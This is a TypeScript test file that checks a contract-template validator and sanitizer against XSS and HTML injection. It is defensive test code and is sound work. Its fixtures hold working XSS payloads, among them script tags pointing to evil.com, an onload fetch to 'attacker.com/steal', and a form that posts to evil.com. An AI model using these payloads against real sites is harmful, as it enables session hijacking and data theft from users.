// lib/security/security.test.ts
// Integration tests for security features
// Tests the full security pipeline: validation + sanitization + rendering

import { describe, it, expect } from 'vitest';
import { validateTemplateSecurityComprehensive } from './templateValidator';
import {
  sanitizeTemplateInput,
  sanitizeRenderedOutput,
} from './templateSanitizer';

describe('Security Integration Tests', () => {
  describe('Full Security Pipeline', () => {
    it('should block XSS attempts through validation', () => {
      const malicious = '<script>document.location="http://evil.com"</script>';
      
      const validation = validateTemplateSecurityComprehensive(malicious);
      expect(validation.valid).toBe(false);
      expect(validation.errors.length).toBeGreaterThan(0);
    });

    it('should sanitize output even if validation passes edge case', () => {
      // Edge case: somehow a problematic template gets through
      const edgeCase = '<div>Content</div>';
      const validation = validateTemplateSecurityComprehensive(edgeCase);
      expect(validation.valid).toBe(true);
      
      // Even if validation passes, sanitization should still apply
      const sanitized = sanitizeRenderedOutput(edgeCase);
      expect(sanitized).toContain('Content');
    });

    it('should handle template transformation safely', () => {
      // Original template with potential issues
      const original = '<div onclick="alert(1)">Content</div>';
      
      // Step 1: Validate
      const validation = validateTemplateSecurityComprehensive(original);
      expect(validation.valid).toBe(false);
      
      // If it gets sanitized anyway
      const sanitized = sanitizeTemplateInput(original);
      expect(sanitized).not.toContain('onclick');
    });
  });

  describe('Admin Template Creation Security', () => {
    it('should reject admin-submitted templates with script tags', () => {
      const adminTemplate = `
        <div class="contract">
          <h1>Contract</h1>
          <script src="https://cdn.example.com/analytics.js"></script>
        </div>
      `;
      
      const validation = validateTemplateSecurityComprehensive(adminTemplate);
      expect(validation.valid).toBe(false);
    });

    it('should reject templates with event handler injection', () => {
      const adminTemplate = `
        <div class="contract" onload="fetch('https://attacker.com/steal')">
          <p>Contract Details</p>
        </div>
      `;
      
      const validation = validateTemplateSecurityComprehensive(adminTemplate);
      expect(validation.valid).toBe(false);
    });

    it('should allow legitimate admin templates with Handlebars', () => {
      const adminTemplate = `
        <div class="contract">
          <h1>{{contractType}}</h1>
          {{#if parties}}
            <ul>
              {{#each parties}}
                <li>{{this.name}}</li>
              {{/each}}
            </ul>
          {{/if}}
        </div>
      `;
      
      const validation = validateTemplateSecurityComprehensive(adminTemplate);
      expect(validation.valid).toBe(true);
    });
  });

  describe('Contract Data Rendering Security', () => {
    it('should sanitize rendered contract with user-supplied data', () => {
      // Simulate Handlebars rendering with user data
      const rendered = `
        <div class="contract">
          <p>Party Name: <strong>John &lt;script&gt;alert('XSS')&lt;/script&gt; Doe</strong></p>
          <p>Amount: <strong>$1,000</strong></p>
        </div>
      `;
      
      const sanitized = sanitizeRenderedOutput(rendered);
      // HTML entities should be preserved
      expect(sanitized).toContain('John');
      // Script tags should be removed/escaped
      expect(sanitized).not.toContain('<script>');
    });

    it('should handle special characters in rendered output', () => {
      const rendered = `
        <div>
          <p>Name: John "The Contractor" Doe</p>
          <p>Details: 50% discount & free shipping</p>
        </div>
      `;
      
      const sanitized = sanitizeRenderedOutput(rendered);
      expect(sanitized).toContain('John');
      expect(sanitized).toContain('Contractor');
    });

    it('should preserve international content in rendered output', () => {
      const rendered = `
        <div class="contract">
          <p>ผู้ให้เช่า: นายสมชาย ใจดี</p>
          <p>ผู้เช่า: นางสาวสมหญิง รักเรียน</p>
          <p>ค่าเช่า: 15,000 บาท</p>
        </div>
      `;
      
      const sanitized = sanitizeRenderedOutput(rendered);
      expect(sanitized).toContain('ผู้ให้เช่า');
      expect(sanitized).toContain('นายสมชาย');
      expect(sanitized).toContain('15,000 บาท');
    });
  });

  describe('XSS Prevention Vectors', () => {
    const xssVectors = [
      {
        name: 'Basic script tag',
        payload: '<script>alert("XSS")</script>',
      },
      {
        name: 'Script with attributes',
        payload: '<script src="http://evil.com/script.js"></script>',
      },
      {
        name: 'Event handler',
        payload: '<img src=x onerror="alert(\'XSS\')">',
      },
      {
        name: 'SVG with event handler',
        payload: '<svg onload="alert(\'XSS\')"></svg>',
      },
      {
        name: 'Data URI in image',
        payload: '<img src="data:text/html,<script>alert(\'XSS\')</script>">',
      },
      {
        name: 'Iframe injection',
        payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      },
      {
        name: 'Form hijacking',
        payload: '<form action="http://evil.com" method="POST"><input type="submit"></form>',
      },
    ];

    xssVectors.forEach(({ name, payload }) => {
      it(`should prevent: ${name}`, () => {
        const validation = validateTemplateSecurityComprehensive(payload);
        
        // Should either fail validation or be sanitized
        if (validation.valid) {
          const sanitized = sanitizeTemplateInput(payload);
          // Check that something changed
          expect(sanitized.length).toBeLessThanOrEqual(payload.length);
        } else {
          expect(validation.errors.length).toBeGreaterThan(0);
        }
      });
    });
  });

  describe('HTML Injection Prevention', () => {
    it('should handle broken HTML gracefully', () => {
      const brokenHtml = '<div><p>Paragraph 1<p>Paragraph 2</div></div>';
      const validation = validateTemplateSecurityComprehensive(brokenHtml);
      // Might warn or error about unclosed tags
      expect(validation.errors.length + validation.warnings.length).toBeGreaterThan(0);
    });

    it('should handle deeply nested tags', () => {
      const nested = '<div><div><div><p>Deep content</p></div></div></div>';
      const validation = validateTemplateSecurityComprehensive(nested);
      expect(validation.valid).toBe(true);
    });

    it('should handle malformed closing tags', () => {
      const malformed = '<div>Content</p></div>';
      // This might not be caught by basic validation
      const validation = validateTemplateSecurityComprehensive(malformed);
      // At minimum, should not crash
      expect(validation).toBeDefined();
    });
  });

  describe('Handlebars Injection Prevention', () => {
    it('should prevent Handlebars code execution attempts', () => {
      // Handlebars doesn't execute arbitrary code, but we should validate syntax
      const malicious = '{{#if (function(){alert("XSS")})}}<p>test</p>{{/if}}';
      const validation = validateTemplateSecurityComprehensive(malicious);
      // Should fail due to invalid Handlebars syntax
      expect(validation.valid).toBe(false);
    });

    it('should validate complex nested Handlebars', () => {
      const complex = `
        {{#if user}}
          {{#each user.roles}}
            {{#if (eq this.name "admin")}}
              <p>Admin: {{user.name}}</p>
            {{/if}}
          {{/each}}
        {{/if}}
      `;
      const validation = validateTemplateSecurityComprehensive(complex);
      expect(validation.valid).toBe(true);
    });
  });

  describe('Content Security Layers', () => {
    it('should apply multiple security layers', () => {
      // A template that might bypass some checks
      const suspicious = '<div class="contract"><p>Content</p></div>';
      
      // Layer 1: Validation
      const validation = validateTemplateSecurityComprehensive(suspicious);
      expect(validation).toBeDefined();
      
      // Layer 2: Template Input Sanitization
      const templateSanitized = sanitizeTemplateInput(suspicious);
      expect(templateSanitized).toContain('contract');
      
      // Layer 3: Output Sanitization
      const outputSanitized = sanitizeRenderedOutput(templateSanitized);
      expect(outputSanitized).toContain('Content');
    });

    it('should handle admin-created content in templates', () => {
      // Simulate admin creating a template with data placeholders
      const adminTemplate = `
        <div class="contract">
          <p>Lessor: {{lessorName}}</p>
          <p>Lessee: {{lesseeName}}</p>
        </div>
      `;
      
      const validation = validateTemplateSecurityComprehensive(adminTemplate);
      expect(validation.valid).toBe(true);
      
      const sanitized = sanitizeTemplateInput(adminTemplate);
      expect(sanitized).toContain('lessorName');
      expect(sanitized).toContain('lesseeName');
    });

    it('should handle user-submitted data in rendered templates', () => {
      // Simulate rendered template with user data
      const rendered = `
        <div class="contract">
          <p>Lessor: John OReilley</p>
          <p>Lessee: Jane Smith Doe</p>
          <p>Amount: $1,000.00</p>
        </div>
      `;
      
      const sanitized = sanitizeRenderedOutput(rendered);
      expect(sanitized).toContain('John');
      expect(sanitized).toContain('Smith');
      expect(sanitized).toContain('1,000.00');
    });
  });

  describe('Compliance with Security Requirements', () => {
    it('should validate template before publishing (Requirement 7.6)', () => {
      const template = '<script>alert("XSS")</script>';
      const validation = validateTemplateSecurityComprehensive(template);
      
      // Publishing should fail validation
      expect(validation.valid).toBe(false);
    });

    it('should prevent XSS pattern in templates (Requirement 7.6)', () => {
      const xssPatterns = [
        '<script>',
        'onclick=',
        'onerror=',
        'onload=',
      ];
      
      for (const pattern of xssPatterns) {
        const template = `<div>${pattern}"alert(1)"</div>`;
        const validation = validateTemplateSecurityComprehensive(template);
        expect(validation.valid).toBe(false);
      }
    });

    it('should detect unclosed HTML tags (Requirement 7.6)', () => {
      const malformed = '<div><p>Content</div>';
      const validation = validateTemplateSecurityComprehensive(malformed);
      
      // Should warn about unclosed tags
      expect(validation.errors.length + validation.warnings.length).toBeGreaterThan(0);
    });

    it('should detect unclosed Handlebars blocks (Requirement 7.6)', () => {
      const malformed = '<div>{{#if condition}}<p>Content</p></div>';
      const validation = validateTemplateSecurityComprehensive(malformed);
      
      // Should error about unclosed if block
      expect(validation.valid).toBe(false);
    });
  });
});
